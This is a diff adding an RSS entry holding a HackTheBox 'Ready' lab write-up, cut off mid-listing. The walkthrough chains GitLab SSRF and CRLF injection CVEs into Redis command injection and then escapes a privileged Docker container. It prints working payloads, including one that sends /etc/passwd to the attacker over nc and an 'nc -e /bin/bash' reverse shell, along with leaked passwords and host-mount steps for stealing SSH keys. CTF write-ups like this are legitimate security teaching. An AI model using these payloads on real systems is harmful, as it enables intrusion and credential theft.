@@ -8,6 +8,374 @@
     <lastBuildDate>Sat, 15 May 2021 22:00:39 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/gitlab/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Ready</title>
+      <link>https://fahmifj.github.io/hackthebox/ready/</link>
+      <pubDate>Sat, 15 May 2021 22:00:39 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/ready/</guid>
+      <description>Turns SSRF to remote code execution and escape from a Docker container</description>
+      <content:encoded><![CDATA[<p>Ready from HackTheBox features a GitLab instance in a Docker container. Chaining two GitLab CVEs (CVE-2018-19571 &amp; CVE-2018-19585) allows me to gain a foothold on the container. Enumerating the container discovers a password that can be used on the container&rsquo;s root account. Since the container running in privileged mode, it is possible to mount the host file system into the container.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>GitLab 11.4.7 exploitation</li>
+<li>Chaining bugs from CVE-2018-19571 and CVE-2018-19585</li>
+<li>Docker security</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>BurpSuite - Preinstalled in Kali Linux</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>All ports scan with <code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 5080</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «ready» «10.10.14.20» 
+$ nmap -p- -sV --reason -oA nmap/10-initial-ready <span class="s1">&#39;10.10.10.220&#39;</span>
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-14 04:53 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.220
+Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.18s latency<span class="o">)</span>.
+Not shown: <span class="m">65533</span> closed ports
+Reason: <span class="m">65533</span> resets
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.2p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+5080/tcp open  http    syn-ack ttl <span class="m">62</span> nginx
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 503.44 seconds
+</code></pre></div><p>After performing a default script scan shows there&rsquo;s a GitLab instance on port 5080.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «ready» «10.10.14.20» 
+$ nmap -p22,5080 -sC -sV --reason -oA nmap/10-default-ready 10.10.10.220
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-14 05:17 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.220
+Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.090s latency<span class="o">)</span>.
+
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.2p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+5080/tcp open  http    syn-ack ttl <span class="m">62</span> nginx
+<span class="p">|</span> http-robots.txt: <span class="m">53</span> disallowed entries <span class="o">(</span><span class="m">15</span> shown<span class="o">)</span>
+<span class="p">|</span> / /autocomplete/users /search /api /admin /profile 
+<span class="p">|</span> /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+<span class="p">|</span>_/s/ /snippets/new /snippets/*/edit
+<span class="p">|</span> http-title: Sign in <span class="se">\x</span>C2<span class="se">\x</span>B7 GitLab
+<span class="p">|</span>_Requested resource was http://10.10.10.220:5080/users/sign_in
+<span class="p">|</span>_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.70 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-5080---gitlab">TCP 5080 - GitLab</h3>
+<p>The page displays a self-hosted GitLab Community Edition.</p>
+<p><div class="img-container"><img src="imgs/image-20210514162031899.png" alt="image-20210514162031899"  /></div>
+</p>
+<p>I can register with any email domain.</p>
+<p><div class="img-container"><img src="imgs/image-20210514162151369.png" alt="image-20210514162151369"  /></div>
+</p>
+<p>The GitLab version can be seen by visiting<code>/help</code>, and it seems to be an outdated one.</p>
+<p><div class="img-container"><img src="imgs/image-20210514162920343.png" alt="image-20210514162920343"  /></div>
+</p>
+<p>I&rsquo;ll take a note on the version.</p>
+<h4 id="user-enumeration-via-gitlab-api">User Enumeration via GitLab API</h4>
+<p>I can enumerate the GitLab users via <code>/api/v4/users</code>, but in the end, this was not used.</p>
+<p><div class="img-container"><img src="imgs/image-20210514162754664.png" alt="image-20210514162754664"  /></div>
+</p>
+<p>I&rsquo;ll move and search for vulnerabilities.</p>
+<h4 id="searchsploit">Searchsploit</h4>
+<p>I can feed the GitLab version to <code>searchsploit</code>, and it returns with two exploits that match with the version.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «~» «10.10.14.20» 
+$ searchsploit GitLab 11.4.7    
+-------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                            <span class="p">|</span>  Path
+-------------------------------------------------------------------------- ---------------------------------
+GitLab 11.4.7 - RCE <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                   <span class="p">|</span> ruby/webapps/49334.py
+GitLab 11.4.7 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>                 <span class="p">|</span> ruby/webapps/49257.py
+-------------------------------------------------------------------------- ---------------------------------
+</code></pre></div><p>I relaxed the keyword to find other potential exploits, and I found an arbitrary file read which previously was used to exploit <a href="/writeup/hackthebox/htb-laboratory">Laboratory</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploit» «10.10.14.20»
+$ searchsploit GitLab
+-------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                            <span class="p">|</span>  Path
+-------------------------------------------------------------------------- ---------------------------------
+GitLab - <span class="s1">&#39;impersonate&#39;</span> Feature Privilege Escalation                       <span class="p">|</span> ruby/webapps/40236.txt
+GitLab 11.4.7 - RCE <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                   <span class="p">|</span> ruby/webapps/49334.py
+GitLab 11.4.7 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>                 <span class="p">|</span> ruby/webapps/49257.py
+GitLab 12.9.0 - Arbitrary File Read                                       <span class="p">|</span> ruby/webapps/48431.txt
+Gitlab 12.9.0 - Arbitrary File Read <span class="o">(</span>Authenticated<span class="o">)</span>                       <span class="p">|</span> ruby/webapps/49076.py
+Gitlab 6.0 - Persistent Cross-Site Scripting                              <span class="p">|</span> php/webapps/30329.sh
+Gitlab-shell - Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                                <span class="p">|</span> linux/remote/34362.rb
+Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting         <span class="p">|</span> java/webapps/47927.txt
+NPMJS gitlabhook 0.0.17 - <span class="s1">&#39;repository&#39;</span> Remote Command Execution           <span class="p">|</span> json/webapps/47420.txt
+-------------------------------------------------------------------------- ---------------------------------
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-git">Shell as git</h3>
+<h4 id="gitlab-1147-rce-cve-2018-19571--cve-2018-19585---poc">GitLab 11.4.7 RCE (CVE-2018-19571 &amp; CVE-2018-19585) - PoC</h4>
+<p>The RCE exploit that was popped on <code>searchsploit</code> above is consist of two vulnerabilities, SSRF (CVE-2018-19571) and CRLF Injection (CVE-2018-19585). The exploit&rsquo;s author uses the <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">LifeOverFlow</a>&rsquo;s blog post as reference. So I decided to read that blog and try to reproduce it here.</p>
+<p>With SSRF, you can talk with the internal Redis server on port 6379 that used by GitLab as database, cache and message broker. If there is an HTTP request sent to the Redis server using SSRF, the request would read as follows (<code># ==&gt;</code>  is a comment by me)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">GET blablabla HTTP/1.1 # ==&gt; Redis read this as a command 
+</span><span class="err">Host: [0:0:0:0:0:ffff:127.0.0.1]:6379 
+</span><span class="err">User-Agent: git/2.18.1  
+</span><span class="err">Accept: */* 
+</span><span class="err">Accept-Encoding: deflate, gzip 
+</span><span class="err">Pragma: no-cache 
+</span><span class="err">
+</span><span class="err">- Err wrong number of arguments for &#39;get&#39; command 
+</span></code></pre></div><p>The idea here is to leverage the Import project feature from GitLab to talk to Redis server, and insert a payload in the URL using CRLF injection.</p>
+<p>On GitLab, I’ll import a (non-exist) project and choose the &ldquo;Repo by URL&rdquo; menu.</p>
+<p><div class="img-container"><img src="imgs/image-20210514171125509.png" alt="image-20210514171125509"  /></div>
+</p>
+<p>I&rsquo;ll be using the same SSRF payload to bypass the GitLab URL filter which is <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</code> and add my (non-exist) <code>.git</code> repository at the end of the URL, so it becomes <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ssrf-test.git</code></p>
+<p><div class="img-container"><img src="imgs/image-20210515000620634.png" alt="image-20210515000620634"  /></div>
+</p>
+<blockquote>
+<p>The repository URL above is a <a href="http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm">special IPv6 address</a> where its last 32 bits is used to embed the IPv4 address. The URL was used to bypass the SSRF protection defined in <code>spec/lib/gitlab/url_blocker_spec.rb</code></p>
+</blockquote>
+<p>I&rsquo;ll intercept the request after I hit the “Create Project” button, and then on Burp Suite, I’ll replace the import URL with the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
+ multi
+
+ sadd resque:gitlab:queues system_hook_push
+
+ lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;
+
+ exec
+ exec
+/ssrf-test.git
+</code></pre></div><p>So the full request now looks like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/projects</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.10.220:5080</span>
+<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.10.220:5080/projects/new</span>
+<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="n">Content-Length</span><span class="o">:</span> <span class="l">778</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="n">Cookie</span><span class="o">:</span> <span class="l">sidebar_collapsed=false; _gitlab_session=4426e39af6c1d3d4a4484a8a53f0bac9; event_filter=all</span>
+<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+utf8=%E2%9C%93&amp;authenticity_token=cbS9UXXZDmvTgBUhOTMxF%2FOSii%2FgetcSbM%2FNTT2dG6NllhoQsV8uvbDU65arU9dEOumftKI48ZaDBi6rnJbjOQ%3D%3D&amp;project%5Bimport_url%5D= git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
+ multi
+
+ sadd resque:gitlab:queues system_hook_push
+
+ lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;
+
+ exec
+ exec
+/ssrf-test.git&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=SSRF+test&amp;project%5Bnamespace_id%5D=5&amp;project%5Bpath%5D=ssrf-test&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0
+</code></pre></div><p>When I hit the send button, my listener obtains the file contents of <code>/etc/passwd</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"> root@kali «exploit» «10.10.14.20» 
+$ nc -nvlp <span class="m">9000</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
+connect to <span class="o">[</span>10.10.14.20<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.220<span class="o">]</span> <span class="m">36612</span>
+...&lt;SNIP&gt;...
+git:x:998:998::/var/opt/gitlab:/bin/sh
+gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
+gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
+gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
+mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
+registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
+gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
+gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
+dude:x:1000:1000::/home/dude:/bin/bash
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210515002210570.png" alt="image-20210515002210570"  /></div>
+</p>
+<h4 id="weaponize---reverse-shell">Weaponize - Reverse Shell</h4>
+<p>From here, I’ll reproduce the step above, but this time I’ll send myself a shell. The payload as follows.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
+ multi
+
+ sadd resque:gitlab:queues system_hook_push
+
+ lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|nc -e /bin/bash 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;
+
+ exec
+ exec
+/ssrf-to-rce.git
+</code></pre></div><p>On my <code>nc</code> listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploit» «10.10.14.20» 
+$ nc -nvlp <span class="m">9000</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
+connect to <span class="o">[</span>10.10.14.20<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.220<span class="o">]</span> <span class="m">37306</span>
+id
+<span class="nv">uid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span>
+hostname
+gitlab.example.com
+<span class="nb">pwd</span>   
+/var/opt/gitlab/gitlab-rails/working
+</code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
+<p>I&rsquo;ll do the &lsquo;stty&rsquo; trick to <a href="https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1">upgrade my shell</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">which python3
+/opt/gitlab/embedded/bin/python3
+python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+git@gitlab:~/gitlab-rails/working$ ^Z
+<span class="o">[</span>2<span class="o">]</span>  + <span class="m">2354</span> suspended  nc -nvlp <span class="m">9000</span>
+→ root@kali «exploit» «10.10.14.20» 
+$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>2<span class="o">]</span>  - <span class="m">2354</span> continued  nc -nvlp <span class="m">9000</span>
+
+git@gitlab:~/gitlab-rails/working$ 
+git@gitlab:~/gitlab-rails/working$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div><p>On <code>/home</code>, there is only one user called <code>dude</code>, and I&rsquo;m able to read the user flag there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@gitlab:/home/dude$ ls -la
+total <span class="m">24</span>
+drwxr-xr-x <span class="m">2</span> dude dude <span class="m">4096</span> Dec  <span class="m">7</span> 16:58 .
+drwxr-xr-x <span class="m">1</span> root root <span class="m">4096</span> Dec  <span class="m">2</span> 10:45 ..
+lrwxrwxrwx <span class="m">1</span> root root    <span class="m">9</span> Dec  <span class="m">7</span> 16:58 .bash_history -&gt; /dev/null
+-rw-r--r-- <span class="m">1</span> dude dude  <span class="m">220</span> Aug <span class="m">31</span>  <span class="m">2015</span> .bash_logout
+-rw-r--r-- <span class="m">1</span> dude dude <span class="m">3771</span> Aug <span class="m">31</span>  <span class="m">2015</span> .bashrc
+-rw-r--r-- <span class="m">1</span> dude dude  <span class="m">655</span> May <span class="m">16</span>  <span class="m">2017</span> .profile
+-r--r----- <span class="m">1</span> dude git    <span class="m">33</span> Dec  <span class="m">2</span> 10:46 user.txt
+git@gitlab:/home/dude$ cat user.txt 
+e1e30b052b6ec0670698...&lt;SNIP&gt;...
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="container---shell-as-root">Container - Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>I found a <code>.dockerenv</code> on the root directory which indicates that I&rsquo;m inside container, and there is also a file called <code>root_pass</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@gitlab:~$ ls -la /
+total <span class="m">104</span>
+drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Dec  <span class="m">1</span> 12:41 .
+drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Dec  <span class="m">1</span> 12:41 ..
+-rwxr-xr-x   <span class="m">1</span> root root    <span class="m">0</span> Dec  <span class="m">1</span> 12:41 .dockerenv
+...&lt;SNIP&gt;...
+-rw-r--r--   <span class="m">1</span> root root   <span class="m">23</span> Jun <span class="m">29</span>  <span class="m">2020</span> root_pass
+</code></pre></div><p>The content of <code>root_pass</code> is a random string, which I think it is a password. I tried it to the user and root account but it didn&rsquo;t work.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@gitlab:/opt/backup$ cat /root_pass 
+YG65407Bjqvv9A0a8Tm_7w
+</code></pre></div><p>Exploring on <code>/opt</code>, I found a folder called <code>backup</code>. The folder contains three files: <code>docker-compose.yml</code>, <code>gitlab-secrets.json</code> and <code>gitlab.rb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@gitlab:/opt/backup$ ls -l
+total <span class="m">100</span>
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">872</span> Dec  <span class="m">7</span> 09:25 docker-compose.yml
+-rw-r--r-- <span class="m">1</span> root root <span class="m">15092</span> Dec  <span class="m">1</span> 16:23 gitlab-secrets.json
+-rw-r--r-- <span class="m">1</span> root root <span class="m">79639</span> Dec  <span class="m">1</span> 19:20 gitlab.rb
+</code></pre></div><p>Upon performing a recursive grep to search for files containing a &ldquo;pass&rdquo; string inside the folder, I discovered an SMTP password on <code>gitlab.rb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@gitlab:/opt/backup$ grep -Ri <span class="s2">&#34;pass&#34;</span>
+...&lt;SNIP&gt;...
+gitlab.rb:gitlab_rails<span class="o">[</span><span class="s1">&#39;smtp_password&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&#34;wW59U!ZKMbG9+*#h&#34;</span>
+...&lt;SNIP&gt;...
+</code></pre></div><p>Looking into the <code>docker-compose.yml</code>, I see a potential vector for container breakout.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="l">git@gitlab:/opt/backup$ cat docker-compose.yml </span><span class="w">
+</span><span class="w"></span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;2.4&#39;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="nt">services</span><span class="p">:</span><span class="w">
+</span><span class="w">  </span><span class="nt">web</span><span class="p">:</span><span class="w">
+</span><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;gitlab/gitlab-ce:11.4.7-ce.0&#39;</span><span class="w">
+</span><span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l">always</span><span class="w">
+</span><span class="w">    </span><span class="nt">hostname</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;gitlab.example.com&#39;</span><span class="w">
+</span><span class="w">    </span><span class="nt">environment</span><span class="p">:</span><span class="w">
+</span><span class="w">      </span><span class="nt">GITLAB_OMNIBUS_CONFIG</span><span class="p">:</span><span class="w"> </span><span class="p">|</span><span class="sd">
+</span><span class="sd">        external_url &#39;http://172.19.0.2&#39;
+</span><span class="sd">        redis[&#39;bind&#39;]=&#39;127.0.0.1&#39;
+</span><span class="sd">        redis[&#39;port&#39;]=6379
+</span><span class="sd">        gitlab_rails[&#39;initial_root_password&#39;]=File.read(&#39;/root_pass&#39;)</span><span class="w">        
+</span><span class="w">    </span><span class="nt">networks</span><span class="p">:</span><span class="w">
+</span><span class="w">      </span><span class="nt">gitlab</span><span class="p">:</span><span class="w">
+</span><span class="w">        </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="m">172.19.0.2</span><span class="w">
+</span><span class="w">    </span><span class="nt">ports</span><span class="p">:</span><span class="w">
+</span><span class="w">      </span>- <span class="s1">&#39;5080:80&#39;</span><span class="w">
+</span><span class="w">      </span><span class="c">#- &#39;127.0.0.1:5080:80&#39;</span><span class="w">
+</span><span class="w">      </span><span class="c">#- &#39;127.0.0.1:50443:443&#39;</span><span class="w">
+</span><span class="w">      </span><span class="c">#- &#39;127.0.0.1:5022:22&#39;</span><span class="w">
+</span><span class="w">    </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
+</span><span class="w">      </span>- <span class="s1">&#39;./srv/gitlab/config:/etc/gitlab&#39;</span><span class="w">
+</span><span class="w">      </span>- <span class="s1">&#39;./srv/gitlab/logs:/var/log/gitlab&#39;</span><span class="w">
+</span><span class="w">      </span>- <span class="s1">&#39;./srv/gitlab/data:/var/opt/gitlab&#39;</span><span class="w">
+</span><span class="w">      </span>- <span class="s1">&#39;./root_pass:/root_pass&#39;</span><span class="w">
+</span><span class="w">    </span><span class="nt">privileged</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="c"># ==&gt; Potential privesc vector</span><span class="w">
+</span><span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l">unless-stopped</span><span class="w">
+</span><span class="w">    </span><span class="c">#mem_limit: 1024m</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="nt">networks</span><span class="p">:</span><span class="w">
+</span><span class="w">  </span><span class="nt">gitlab</span><span class="p">:</span><span class="w">
+</span><span class="w">    </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="l">bridge</span><span class="w">
+</span><span class="w">    </span><span class="nt">ipam</span><span class="p">:</span><span class="w">
+</span><span class="w">      </span><span class="nt">config</span><span class="p">:</span><span class="w">
+</span><span class="w">        </span>- <span class="nt">subnet</span><span class="p">:</span><span class="w"> </span><span class="m">172.19.0.0</span><span class="l">/16</span><span class="w">
+</span></code></pre></div><h4 id="su---root-container">su - root (container)</h4>
+<p>The password <code>wW59U!ZKMbG9+*#h</code> works on the container root account</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@gitlab:/opt/gitlab$ su root
+Password: wW59U!ZKMbG9+*#h
+root@gitlab:/opt/gitlab# id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div><h3 id="host---shell-as-root">Host - Shell as root</h3>
+<h4 id="docker-breakout---cap_sys_admin">Docker Breakout - CAP_SYS_ADMIN</h4>
+<p>Based on the <code>docker-compose.yml</code> file, I suspect the container is running with privileged flag. According to my favorite blog, which is <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#">BookHackTrick</a>, a container with privileged flag will have access to the host devices.</p>
+<p>Make sure I have access to the host devices, I can run  <code>capsh --print</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gitlab:/opt/gitlab# capsh --print
+Current: <span class="o">=</span> cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip
+...&lt;SNIP&gt;...
+</code></pre></div><p>There is a <code>CAP_SYS_ADMIN</code>, with this capabilities I&rsquo;m able to mount the host devices to make it available on the container. I can list all the host devices with <code>fdisk -l</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gitlab:~# fdisk -l
+
+...&lt;SNIP&gt;...
+Disk /dev/sda: <span class="m">20</span> GiB, <span class="m">21474836480</span> bytes, <span class="m">41943040</span> sectors
+Units: sectors of <span class="m">1</span> * <span class="nv">512</span> <span class="o">=</span> <span class="m">512</span> bytes
+Sector size <span class="o">(</span>logical/physical<span class="o">)</span>: <span class="m">512</span> bytes / <span class="m">512</span> bytes
+I/O size <span class="o">(</span>minimum/optimal<span class="o">)</span>: <span class="m">512</span> bytes / <span class="m">512</span> bytes
+Disklabel type: gpt
+Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E
+
+Device        Start      End  Sectors Size Type
+/dev/sda1      <span class="m">2048</span>     <span class="m">4095</span>     <span class="m">2048</span>   1M BIOS boot
+/dev/sda2      <span class="m">4096</span> <span class="m">37746687</span> <span class="m">37742592</span>  18G Linux filesystem <span class="c1"># the root (/) dir</span>
+/dev/sda3  <span class="m">37746688</span> <span class="m">41940991</span>  <span class="m">4194304</span>   2G Linux swap
+</code></pre></div><p>Now I can simply mount the Linux filesystem (<code>/dev/sda2</code>) to my specified folder.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gitlab:/media# mkdir iamf
+root@gitlab:/media# mount /dev/sda2 /media/iamf
+root@gitlab:/media# ls iamf/
+bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
+boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
+</code></pre></div><p>The root user of the host has SSH keys, I’ll grab only the private key to my machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gitlab:/media# ls -l iamf/root/.ssh/ 
+total <span class="m">12</span>
+-rw------- <span class="m">1</span> root root  <span class="m">405</span> Dec  <span class="m">7</span> 16:49 authorized_keys
